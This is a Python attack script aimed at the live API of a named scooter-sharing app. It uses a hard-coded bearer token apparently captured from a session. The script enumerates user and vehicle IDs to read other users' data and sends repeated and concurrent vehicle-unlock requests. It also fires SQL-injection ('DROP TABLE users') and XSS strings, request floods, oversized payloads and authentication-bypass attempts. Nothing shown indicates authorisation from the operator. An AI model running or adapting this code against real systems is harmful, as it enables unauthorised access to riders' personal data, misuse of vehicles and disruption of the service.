#!/usr/bin/env python3
"""
Deep App Analysis for MaynDrive
Comprehensive vulnerability discovery beyond privilege escalation
"""

import requests
import json
import time
import re
import base64
from datetime import datetime

# API Configuration
BASE_URL = "https://api.knotcity.io"

# Fresh token from capture
FRESH_TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDM0OTMsInNlc3Npb25faWQiOiI3NmM0NzE3ZS03ZWM5LTRkN2MtOWRlOS00NjRiNjJlY2VhYzgiLCJpYXQiOjE3NTk0NTQ3NjQsImV4cCI6MTc1OTQ1ODM2NH0.ivnhjjDy1zEtAD1BTJAAK5V1vDtAaSHNuHZWpMspSFE"

def test_idor_vulnerabilities():
    """Test for Insecure Direct Object Reference vulnerabilities"""
    print("=" * 80)
    print("[DEEP ANALYSIS] IDOR (Insecure Direct Object Reference) VULNERABILITIES")
    print("=" * 80)
    print("[TARGET] Test for IDOR vulnerabilities in user/vehicle data access")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Test different user IDs to see if we can access other users' data
    test_user_ids = [
        1, 2, 3, 4, 5,  # Low IDs (potential admin/system users)
        10, 20, 30, 40, 50,  # Common test IDs
        100, 200, 300, 400, 500,  # Mid-range IDs
        1000, 2000, 3000, 4000, 5000,  # Higher IDs
        103492, 103494, 103495,  # Adjacent to current user (103493)
        999999, 999998, 999997,  # High IDs
        0, -1, -2  # Edge cases
    ]
    
    successful_idor = []
    
    for user_id in test_user_ids:
        print(f"\n[TEST] User ID: {user_id}")
        
        # Test different endpoints with user ID
        idor_endpoints = [
            f"/api/application/users/{user_id}",
            f"/api/application/user/{user_id}",
            f"/api/application/users/{user_id}/profile",
            f"/api/application/users/{user_id}/data",
            f"/api/application/users/{user_id}/info",
            f"/api/application/users/{user_id}/details",
            f"/api/application/users/{user_id}/account",
            f"/api/application/users/{user_id}/settings",
            f"/api/application/users/{user_id}/history",
            f"/api/application/users/{user_id}/trips"
        ]
        
        for endpoint in idor_endpoints:
            try:
                response = requests.get(
                    f"{BASE_URL}{endpoint}",
                    headers=headers,
                    timeout=15
                )
                
                if response.status_code == 200:
                    print(f"   [SUCCESS] IDOR found: {endpoint}")
                    print(f"   Response: {response.text[:200]}{'...' if len(response.text) > 200 else ''}")
                    successful_idor.append(f"{endpoint} (User ID: {user_id})")
                elif response.status_code == 403:
                    print(f"   [BLOCKED] Permission denied: {endpoint}")
                elif response.status_code == 404:
                    print(f"   [NOT FOUND] {endpoint}")
                else:
                    print(f"   [INFO] Status {response.status_code}: {endpoint}")
                    
            except Exception as e:
                print(f"   [ERROR] Request failed: {e}")
    
    return successful_idor

def test_vehicle_idor_vulnerabilities():
    """Test for IDOR vulnerabilities in vehicle data access"""
    print("\n" + "=" * 80)
    print("[DEEP ANALYSIS] VEHICLE IDOR VULNERABILITIES")
    print("=" * 80)
    print("[TARGET] Test for IDOR vulnerabilities in vehicle data access")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Test different vehicle IDs and serials
    test_vehicles = [
        "TUF061",  # Known working vehicle
        "SXB306",  # Known blocked vehicle
        "ABC123", "XYZ789", "TEST01", "DEMO01",  # Random vehicles
        "1", "2", "3", "4", "5",  # Numeric IDs
        "100", "200", "300", "400", "500",  # Higher numeric IDs
        "VEH001", "VEH002", "VEH003",  # Common patterns
        "SCOOTER1", "SCOOTER2", "SCOOTER3",  # Common patterns
        "BIKE001", "BIKE002", "BIKE003"  # Common patterns
    ]
    
    successful_vehicle_idor = []
    
    for vehicle_id in test_vehicles:
        print(f"\n[TEST] Vehicle ID: {vehicle_id}")
        
        # Test different vehicle endpoints
        vehicle_endpoints = [
            f"/api/application/vehicles/{vehicle_id}",
            f"/api/application/vehicle/{vehicle_id}",
            f"/api/application/vehicles/{vehicle_id}/info",
            f"/api/application/vehicles/{vehicle_id}/data",
            f"/api/application/vehicles/{vehicle_id}/details",
            f"/api/application/vehicles/{vehicle_id}/status",
            f"/api/application/vehicles/{vehicle_id}/location",
            f"/api/application/vehicles/{vehicle_id}/battery",
            f"/api/application/vehicles/{vehicle_id}/history",
            f"/api/application/vehicles/{vehicle_id}/logs"
        ]
        
        for endpoint in vehicle_endpoints:
            try:
                response = requests.get(
                    f"{BASE_URL}{endpoint}",
                    headers=headers,
                    timeout=15
                )
                
                if response.status_code == 200:
                    print(f"   [SUCCESS] Vehicle IDOR found: {endpoint}")
                    print(f"   Response: {response.text[:200]}{'...' if len(response.text) > 200 else ''}")
                    successful_vehicle_idor.append(f"{endpoint} (Vehicle: {vehicle_id})")
                elif response.status_code == 403:
                    print(f"   [BLOCKED] Permission denied: {endpoint}")
                elif response.status_code == 404:
                    print(f"   [NOT FOUND] {endpoint}")
                else:
                    print(f"   [INFO] Status {response.status_code}: {endpoint}")
                    
            except Exception as e:
                print(f"   [ERROR] Request failed: {e}")
    
    return successful_vehicle_idor

def test_business_logic_vulnerabilities():
    """Test for business logic vulnerabilities"""
    print("\n" + "=" * 80)
    print("[DEEP ANALYSIS] BUSINESS LOGIC VULNERABILITIES")
    print("=" * 80)
    print("[TARGET] Test for business logic flaws and race conditions")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Test business logic vulnerabilities
    business_logic_tests = [
        {
            "name": "Double Unlock Attack",
            "description": "Attempt to unlock the same vehicle multiple times",
            "endpoint": "/api/application/vehicles/unlock",
            "payload": {
                "serial_number": "TUF061",
                "lat": 48.8566,
                "lng": 2.3522
            },
            "iterations": 5
        },
        {
            "name": "Concurrent Unlock Attack",
            "description": "Attempt concurrent unlocks of different vehicles",
            "endpoint": "/api/application/vehicles/unlock",
            "payloads": [
                {"serial_number": "TUF061", "lat": 48.8566, "lng": 2.3522},
                {"serial_number": "SXB306", "lat": 48.8566, "lng": 2.3522},
                {"serial_number": "ABC123", "lat": 48.8566, "lng": 2.3522}
            ]
        },
        {
            "name": "Invalid Location Attack",
            "description": "Test with invalid/impossible locations",
            "endpoint": "/api/application/vehicles/unlock",
            "payloads": [
                {"serial_number": "TUF061", "lat": 999.999, "lng": 999.999},
                {"serial_number": "TUF061", "lat": -999.999, "lng": -999.999},
                {"serial_number": "TUF061", "lat": 0, "lng": 0},
                {"serial_number": "TUF061", "lat": 90.1, "lng": 180.1},
                {"serial_number": "TUF061", "lat": -90.1, "lng": -180.1}
            ]
        },
        {
            "name": "Negative Values Attack",
            "description": "Test with negative values",
            "endpoint": "/api/application/vehicles/unlock",
            "payloads": [
                {"serial_number": "TUF061", "lat": -48.8566, "lng": -2.3522},
                {"serial_number": "TUF061", "lat": 48.8566, "lng": -2.3522},
                {"serial_number": "TUF061", "lat": -48.8566, "lng": 2.3522}
            ]
        },
        {
            "name": "String Injection in Location",
            "description": "Test string injection in numeric fields",
            "endpoint": "/api/application/vehicles/unlock",
            "payloads": [
                {"serial_number": "TUF061", "lat": "48.8566", "lng": "2.3522"},
                {"serial_number": "TUF061", "lat": "48.8566; DROP TABLE users;", "lng": "2.3522"},
                {"serial_number": "TUF061", "lat": "48.8566", "lng": "2.3522<script>alert('xss')</script>"}
            ]
        }
    ]
    
    successful_business_logic = []
    
    for test in business_logic_tests:
        print(f"\n[TEST] {test['name']}")
        print(f"   Description: {test['description']}")
        
        if 'iterations' in test:
            # Test with multiple iterations
            for i in range(test['iterations']):
                print(f"   Iteration {i+1}/{test['iterations']}")
                try:
                    response = requests.post(
                        f"{BASE_URL}{test['endpoint']}",
                        headers=headers,
                        json=test['payload'],
                        timeout=15
                    )
                    
                    print(f"     Status: {response.status_code}")
                    print(f"     Response: {response.text}")
                    
                    if response.status_code == 200:
                        print(f"     [SUCCESS] {test['name']} iteration {i+1} successful!")
                        successful_business_logic.append(f"{test['name']} (Iteration {i+1})")
                    
                except Exception as e:
                    print(f"     [ERROR] Request failed: {e}")
        
        elif 'payloads' in test:
            # Test with multiple payloads
            for i, payload in enumerate(test['payloads']):
                print(f"   Payload {i+1}: {payload}")
                try:
                    response = requests.post(
                        f"{BASE_URL}{test['endpoint']}",
                        headers=headers,
                        json=payload,
                        timeout=15
                    )
                    
                    print(f"     Status: {response.status_code}")
                    print(f"     Response: {response.text}")
                    
                    if response.status_code == 200:
                        print(f"     [SUCCESS] {test['name']} payload {i+1} successful!")
                        successful_business_logic.append(f"{test['name']} (Payload {i+1})")
                    
                except Exception as e:
                    print(f"     [ERROR] Request failed: {e}")
    
    return successful_business_logic

def test_rate_limiting_vulnerabilities():
    """Test for rate limiting and DoS vulnerabilities"""
    print("\n" + "=" * 80)
    print("[DEEP ANALYSIS] RATE LIMITING & DOS VULNERABILITIES")
    print("=" * 80)
    print("[TARGET] Test for rate limiting bypass and DoS vulnerabilities")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Test rate limiting
    print("\n[TEST] Rapid Request Rate Limiting")
    print("   Sending 20 rapid requests to test rate limiting...")
    
    rate_limit_bypassed = False
    successful_requests = 0
    
    for i in range(20):
        try:
            response = requests.get(
                f"{BASE_URL}/api/application/users",
                headers=headers,
                timeout=5
            )
            
            if response.status_code == 200:
                successful_requests += 1
            elif response.status_code == 429:
                print(f"   [RATE LIMITED] Request {i+1} blocked (429)")
                break
            elif response.status_code == 403:
                print(f"   [BLOCKED] Request {i+1} blocked (403)")
                break
            
            print(f"   Request {i+1}: Status {response.status_code}")
            
        except Exception as e:
            print(f"   [ERROR] Request {i+1} failed: {e}")
            break
    
    if successful_requests >= 20:
        rate_limit_bypassed = True
        print(f"   [VULNERABILITY] Rate limiting bypassed - {successful_requests} requests successful")
    
    # Test large payload DoS
    print("\n[TEST] Large Payload DoS")
    large_payload = {
        "serial_number": "TUF061",
        "lat": 48.8566,
        "lng": 2.3522,
        "large_data": "A" * 10000  # 10KB of data
    }
    
    try:
        response = requests.post(
            f"{BASE_URL}/api/application/vehicles/unlock",
            headers=headers,
            json=large_payload,
            timeout=30
        )
        
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text}")
        
        if response.status_code == 200:
            print(f"   [VULNERABILITY] Large payload DoS successful")
            return ["Rate limiting bypass", "Large payload DoS"]
        else:
            print(f"   [OK] Large payload blocked")
            
    except Exception as e:
        print(f"   [ERROR] Large payload test failed: {e}")
    
    return ["Rate limiting bypass"] if rate_limit_bypassed else []

def test_information_disclosure_vulnerabilities():
    """Test for additional information disclosure vulnerabilities"""
    print("\n" + "=" * 80)
    print("[DEEP ANALYSIS] INFORMATION DISCLOSURE VULNERABILITIES")
    print("=" * 80)
    print("[TARGET] Test for additional information disclosure beyond user data")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Test various information disclosure endpoints
    info_endpoints = [
        # Error endpoints that might leak information
        "/api/application/error",
        "/api/application/errors",
        "/api/application/exception",
        "/api/application/exceptions",
        "/api/application/debug",
        "/api/application/debug/info",
        "/api/application/debug/config",
        "/api/application/debug/logs",
        
        # Version and system information
        "/api/application/version",
        "/api/application/versions",
        "/api/application/info",
        "/api/application/information",
        "/api/application/about",
        "/api/application/status",
        "/api/application/health",
        "/api/application/ping",
        
        # Configuration endpoints
        "/api/application/config",
        "/api/application/configuration",
        "/api/application/settings",
        "/api/application/options",
        "/api/application/parameters",
        
        # Log and audit endpoints
        "/api/application/logs",
        "/api/application/log",
        "/api/application/audit",
        "/api/application/audit_logs",
        "/api/application/activity",
        "/api/application/activities",
        
        # Statistics and metrics
        "/api/application/stats",
        "/api/application/statistics",
        "/api/application/metrics",
        "/api/application/analytics",
        "/api/application/reports",
        "/api/application/dashboard",
        
        # Database and system info
        "/api/application/database",
        "/api/application/db",
        "/api/application/system",
        "/api/application/systems",
        "/api/application/server",
        "/api/application/servers",
        
        # API documentation
        "/api/application/docs",
        "/api/application/documentation",
        "/api/application/api",
        "/api/application/swagger",
        "/api/application/openapi",
        
        # Backup and maintenance
        "/api/application/backup",
        "/api/application/backups",
        "/api/application/maintenance",
        "/api/application/maintenance_mode",
        
        # Security endpoints
        "/api/application/security",
        "/api/application/auth",
        "/api/application/authentication",
        "/api/application/authorization",
        "/api/application/permissions",
        "/api/application/roles",
        "/api/application/policies"
    ]
    
    successful_disclosures = []
    
    for endpoint in info_endpoints:
        print(f"\n[TEST] Information endpoint: {endpoint}")
        
        try:
            response = requests.get(
                f"{BASE_URL}{endpoint}",
                headers=headers,
                timeout=15
            )
            
            print(f"   Status: {response.status_code}")
            
            if response.status_code == 200:
                print(f"   [SUCCESS] Information disclosure: {endpoint}")
                print(f"   Response: {response.text[:300]}{'...' if len(response.text) > 300 else ''}")
                successful_disclosures.append(endpoint)
            elif response.status_code == 403:
                print(f"   [BLOCKED] Permission denied")
            elif response.status_code == 404:
                print(f"   [NOT FOUND] Endpoint not found")
            else:
                print(f"   [INFO] Status {response.status_code}")
                
        except Exception as e:
            print(f"   [ERROR] Request failed: {e}")
    
    return successful_disclosures

def test_authentication_bypass_vulnerabilities():
    """Test for authentication bypass vulnerabilities"""
    print("\n" + "=" * 80)
    print("[DEEP ANALYSIS] AUTHENTICATION BYPASS VULNERABILITIES")
    print("=" * 80)
    print("[TARGET] Test for authentication bypass techniques")
    print("=" * 80)
    
    # Test different authentication bypass techniques
    bypass_tests = [
        {
            "name": "No Authorization Header",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Knot-mayndrive v1.1.34 (android)",
                "Accept": "application/json"
            }
        },
        {
            "name": "Empty Authorization Header",
            "headers": {
                "Authorization": "",
                "Content-Type": "application/json",
                "User-Agent": "Knot-mayndrive v1.1.34 (android)",
                "Accept": "application/json"
            }
        },
        {
            "name": "Invalid Authorization Format",
            "headers": {
                "Authorization": "InvalidToken",
                "Content-Type": "application/json",
                "User-Agent": "Knot-mayndrive v1.1.34 (android)",
                "Accept": "application/json"
            }
        },
        {
            "name": "Wrong Bearer Format",
            "headers": {
                "Authorization": "Token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
                "Content-Type": "application/json",
                "User-Agent": "Knot-mayndrive v1.1.34 (android)",
                "Accept": "application/json"
            }
        },
        {
            "name": "Basic Auth Instead of Bearer",
            "headers": {
                "Authorization": "Basic dXNlcjpwYXNz",
                "Content-Type": "application/json",
                "User-Agent": "Knot-mayndrive v1.1.34 (android)",
                "Accept": "application/json"
            }
        },
        {
            "name": "API Key Header",
            "headers": {
                "X-API-Key": "test-api-key",
                "Content-Type": "application/json",
                "User-Agent": "Knot-mayndrive v1.1.34 (android)",
                "Accept": "application/json"
            }
        },
        {
            "name": "Session Cookie",
            "headers": {
                "Cookie": "session=test-session",
                "Content-Type": "application/json",
                "User-Agent": "Knot-mayndrive v1.1.34 (android)",
                "Accept": "application/json"
            }
        }
    ]
    
    successful_bypasses = []
    
    for test in bypass_tests:
        print(f"\n[TEST] {test['name']}")
        print(f"   Headers: {json.dumps(test['headers'], indent=2)}")
        
        payload = {
            "serial_number": "TUF061",
            "lat": 48.8566,
            "lng": 2.3522
        }
        
        try:
            response = requests.post(
                f"{BASE_URL}/api/application/vehicles/unlock",
                headers=test['headers'],
                json=payload,
                timeout=15
            )
            
            print(f"   Status: {response.status_code}")
            print(f"   Response: {response.text}")
            
            if response.status_code == 200:
                print(f"   [SUCCESS] Authentication bypass: {test['name']}")
                successful_bypasses.append(test['name'])
            elif response.status_code == 401:
                print(f"   [BLOCKED] Authentication required")
            elif response.status_code == 403:
                print(f"   [BLOCKED] Permission denied")
            else:
                print(f"   [INFO] Status {response.status_code}")
                
        except Exception as e:
            print(f"   [ERROR] Request failed: {e}")
    
    return successful_bypasses

def main():
    print("=" * 80)
    print("[DEEP ANALYSIS] COMPREHENSIVE VULNERABILITY DISCOVERY")
    print("=" * 80)
    print("[WARNING] Performing deep analysis to find hidden vulnerabilities!")
    print("[TARGET] MaynDrive App - Beyond privilege escalation")
    print("=" * 80)
    
    # Run all deep analysis tests
    idor_results = test_idor_vulnerabilities()
    vehicle_idor_results = test_vehicle_idor_vulnerabilities()
    business_logic_results = test_business_logic_vulnerabilities()
    rate_limiting_results = test_rate_limiting_vulnerabilities()
    info_disclosure_results = test_information_disclosure_vulnerabilities()
    auth_bypass_results = test_authentication_bypass_vulnerabilities()
    
    # Summary
    print("\n" + "=" * 80)
    print("[RESULTS] DEEP ANALYSIS RESULTS")
    print("=" * 80)
    
    print(f"\n[IDOR VULNERABILITIES] Results:")
    if idor_results:
        print(f"   [HIGH] {len(idor_results)} IDOR vulnerabilities found: {idor_results}")
    else:
        print(f"   [OK] No IDOR vulnerabilities found")
    
    print(f"\n[VEHICLE IDOR VULNERABILITIES] Results:")
    if vehicle_idor_results:
        print(f"   [HIGH] {len(vehicle_idor_results)} vehicle IDOR vulnerabilities found: {vehicle_idor_results}")
    else:
        print(f"   [OK] No vehicle IDOR vulnerabilities found")
    
    print(f"\n[BUSINESS LOGIC VULNERABILITIES] Results:")
    if business_logic_results:
        print(f"   [MEDIUM] {len(business_logic_results)} business logic vulnerabilities found: {business_logic_results}")
    else:
        print(f"   [OK] No business logic vulnerabilities found")
    
    print(f"\n[RATE LIMITING VULNERABILITIES] Results:")
    if rate_limiting_results:
        print(f"   [MEDIUM] {len(rate_limiting_results)} rate limiting vulnerabilities found: {rate_limiting_results}")
    else:
        print(f"   [OK] No rate limiting vulnerabilities found")
    
    print(f"\n[INFORMATION DISCLOSURE VULNERABILITIES] Results:")
    if info_disclosure_results:
        print(f"   [HIGH] {len(info_disclosure_results)} information disclosure vulnerabilities found: {info_disclosure_results}")
    else:
        print(f"   [OK] No additional information disclosure vulnerabilities found")
    
    print(f"\n[AUTHENTICATION BYPASS VULNERABILITIES] Results:")
    if auth_bypass_results:
        print(f"   [CRITICAL] {len(auth_bypass_results)} authentication bypass vulnerabilities found: {auth_bypass_results}")
    else:
        print(f"   [OK] No authentication bypass vulnerabilities found")
    
    # Overall assessment
    total_vulnerabilities = (len(idor_results) + len(vehicle_idor_results) + 
                           len(business_logic_results) + len(rate_limiting_results) + 
                           len(info_disclosure_results) + len(auth_bypass_results))
    
    print(f"\n[OVERALL ASSESSMENT]")
    print(f"   Total vulnerabilities found: {total_vulnerabilities}")
    
    if total_vulnerabilities > 0:
        print(f"   [CRITICAL] Additional vulnerabilities discovered!")
        print(f"   [WARNING] MaynDrive app has more security issues!")
    else:
        print(f"   [OK] No additional vulnerabilities found in deep analysis")
        print(f"   [OK] App appears to have good security controls")
    
    print("=" * 80)

if __name__ == "__main__":
    main()
